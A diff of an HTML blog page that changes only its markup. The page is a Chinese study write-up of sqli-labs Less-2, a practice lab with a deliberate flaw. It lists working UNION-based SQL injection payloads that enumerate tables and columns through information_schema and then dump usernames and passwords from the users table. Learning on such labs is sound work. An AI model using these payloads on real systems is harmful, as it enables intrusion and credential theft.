@@ -77,17 +77,19 @@
       
 
       
-        <hr>
-<p>title:sqli-lab 学习记录less2<br>date:2019-3-16<br>tags:sqli-lab</p>
-<hr>
-<h2 id="sqli-lab-学习记录less2"><a href="#sqli-lab-学习记录less2" class="headerlink" title="sqli-lab 学习记录less2"></a>sqli-lab 学习记录less2</h2><p>less2<br>1.我们先来判断这次的sql注入类型<br>我们输入</p>
-<pre><code>?id=1
-?id=1&apos;</code></pre><p>发现第一个语句返回正确<br>但是第二个却有了报错<br>我们因此可以判断<br>这次的sql注入类型为数字类型</p>
-<a id="more"></a>
+        <h1 id="sqli-lab-学习记录less2"><a href="#sqli-lab-学习记录less2" class="headerlink" title="sqli-lab 学习记录less2"></a>sqli-lab 学习记录less2</h1><a id="more"></a>
+
+<p>less2<br>1.我们先来判断这次的sql注入类型<br>我们输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1</span><br><span class="line">?id&#x3D;1&#39;</span><br></pre></td></tr></table></figure>
+<p>发现第一个语句返回正确<br>但是第二个却有了报错<br>我们因此可以判断<br>这次的sql注入类型为数字类型</p>
+<!-- more -->
 <p>2.<br>之后和less1一样<br>我们进行暴表的名字（暴表）<br>我们输入</p>
-<pre><code>?id=0 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()</code></pre><p>我们由此得到<br><img src="https://img-blog.csdnimg.cn/20190316101700495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3.我们之后开始爆列喽<br>输入</p>
-<pre><code>?id=0 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos;</code></pre><p>我们可以得到<br><img src="https://img-blog.csdnimg.cn/20190316102305663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">4.最后我们来获得我们要得到的东西<br>输入代码</p>
-<pre><code>?id=0 union select 1,group_concat(id,username,password),3 from users</code></pre><p>就得到了我们要得到的东西<br><img src="https://img-blog.csdnimg.cn/20190316104403774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">另外<br>我们附加关于where的知识</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure>
+<p>我们由此得到<br><img src="https://img-blog.csdnimg.cn/20190316101700495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3.我们之后开始爆列喽<br>输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0 union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39;</span><br></pre></td></tr></table></figure>
+<p>我们可以得到<br><img src="https://img-blog.csdnimg.cn/20190316102305663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">4.最后我们来获得我们要得到的东西<br>输入代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0 union select 1,group_concat(id,username,password),3 from users</span><br></pre></td></tr></table></figure>
+<p>就得到了我们要得到的东西<br><img src="https://img-blog.csdnimg.cn/20190316104403774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">另外<br>我们附加关于where的知识</p>
 <p>table_schema是数据库名<br>database()函数会返回当前的数据库名<br><img src="https://img-blog.csdnimg.cn/20190316104540872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20190316104550458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>where就是约束条件<br>这个 where后面  就是为了约束一下 我要查询的数据库  而不是去  看其他数据库里的东西<br>我要看的 东西 就是 当前数据库database里的  不是其他的数据里的<br>比如 有两个数据库  数据库1  数据库2   当前的数据库database是数据库1   你可以 where table_schema=database() 或者是where table_schema=’数据库1’</p>
 
       
